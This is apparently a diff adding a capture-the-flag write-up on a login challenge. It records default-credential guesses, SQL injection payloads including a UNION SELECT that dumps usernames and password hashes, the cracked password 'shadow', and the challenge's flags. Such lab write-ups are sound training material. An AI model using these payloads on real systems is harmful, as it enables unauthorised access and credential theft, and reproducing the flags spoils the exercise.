@@ -1,0 +1,47 @@
+tried 
+- basic combos: username/password  Username/Password admin/admin
+- sql injection: ' or 1=1; --
+
+info retrieved with SQL injection : table "Member_Brute_Force" with column "db_default"
+
+in Member_Brute_Force.db_default we have the following :
+
+Title: id
+Title: username
+Title: password
+
+
+
+from the img search :
+
+ 1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default
+
+
+
+NOPE:
+ID:  1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
+Title: 3bf1114a986ba87ed28fc1b5884fc2f8
+Url : root
+
+
+
+
+NOPE:
+ID:  1 and 1=1 UNION SELECT username, password from Member_Brute_Force.db_default 
+Title: 3bf1114a986ba87ed28fc1b5884fc2f8
+Url : admin
+
+
+
+
+
+decrypted (same for both) = 
+shadow
+
+for both combo (root/shadow and admin/shadow) :
+
+pop-up message with
+"Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3"
+then get to page that says:
+"The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 "
+
